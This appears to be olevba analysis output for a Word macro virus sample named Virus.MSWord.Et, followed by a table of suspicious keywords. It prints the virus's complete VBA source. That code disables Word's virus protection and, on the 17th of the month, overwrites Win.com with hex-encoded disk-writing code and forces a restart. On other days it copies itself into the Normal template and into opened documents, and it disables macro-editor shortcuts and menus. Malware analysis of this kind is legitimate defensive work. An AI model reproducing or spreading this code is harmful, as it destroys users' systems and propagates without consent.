olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Et-6e5438fc07d433c229020aeb6e47ebb07136a7e5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Et-6e5438fc07d433c229020aeb6e47ebb07136a7e5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ET_No1.bas 
in file: Virus.MSWord.Et-6e5438fc07d433c229020aeb6e47ebb07136a7e5 - OLE stream: 'Macros/VBA/ET_No1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Attribute GetWindowsDirectory.VB_ProcData.VB_Invoke_Func = "ProVirus.Virus.AutoOpen"
Private Declare Function ExitWindowsEx Lib "User32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Sub AutoOpen()
'
Dim DD As Byte

    On Error Resume Next
    
    Options.VirusProtection = False
    
    If Day(Date) = 17 Then
        Txt1 = "E9FD09"
        Txt2 = "B80103BB0080B90100BA8000CD13E9FC04"
        windir$ = String(144, " ")
        l = GetWindowsDirectory(windir$, 144)
        windir = Left(windir$, l)
        Open windir + "\Win.com" For Binary Access Write Lock Read As #1
            For i = 1 To 3
                DD = "&H" + Mid(Txt1, 2 * i - 1, 2)
                Put #1, , DD
            Next i
            For i = 1 To 17
                DD = "&H" + Mid(Txt2, 2 * i - 1, 2)
                Put #1, 2560 + i, DD
            Next i
        Close #1
        Call ExitWindowsEx(6, 0)
    End If
       
       DocName = ActiveDocument.Path + "\" + ActiveDocument.Name
       DotName = NormalTemplate.Path + "\" + NormalTemplate.Name
    If CommandBars("Visual Basic").Controls(1).Caption <> "ETKill" Then
       Application.OrganizerDelete Source:=DotName, Name:="ET_No1", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=DocName, Destination:=DotName, Name:="ET_No1", Object:=wdOrganizerObjectProjectItems
       DelTools
       CustomizationContext = NormalTemplate
       FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
       CustomizationContext = NormalTemplate
       FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
       For k = 1 To CommandBars("Visual Basic").Controls.Count
            CommandBars("Visual Basic").Controls(1).Delete
       Next k
       Set MyFlag = CommandBars("Visual Basic").Controls.Add(Type:=msoControlButton, ID:=752)
       MyFlag.FaceId = 30
       CommandBars("Visual Basic").Controls(1).Caption = "ETKill"
       NormalTemplate.Save
    Else
       Application.OrganizerCopy Source:=DotName, Destination:=DocName, Name:="ET_No1", Object:=wdOrganizerObjectProjectItems
       ActiveDocument.Save
    End If
End Sub

Sub DelTools()
    For i = 1 To CommandBars("Tools").Controls.Count
       If CommandBars("Tools").Controls(i).Caption = "ºê(&M)" Then
            CommandBars("Tools").Controls(i).Delete
            Exit For
       End If
    Next i
    For i = 1 To CommandBars("Tools").Controls.Count
       If CommandBars("Tools").Controls(i).Caption = "×Ô¶¨Òå(&C)..." Then
            CommandBars("Tools").Controls(i).Delete
            Exit For
       End If
    Next i
    Application.OnTime When:=Now + TimeValue("00:0:01"), Name:="DelTools"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

